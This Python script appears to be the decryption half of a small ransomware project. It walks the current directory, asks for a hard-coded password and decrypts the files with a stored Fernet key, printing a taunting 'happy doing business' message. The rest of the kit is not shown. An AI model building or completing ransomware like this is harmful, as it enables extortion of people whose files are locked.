import os
from cryptography.fernet import Fernet

files = []
password="suck my ass"

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

user_password = input("what is the password\n")

if user_password == password:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("thanks man, happy doing buisness!!!")
else:
    print("nope thats not it dumbass")

print(files)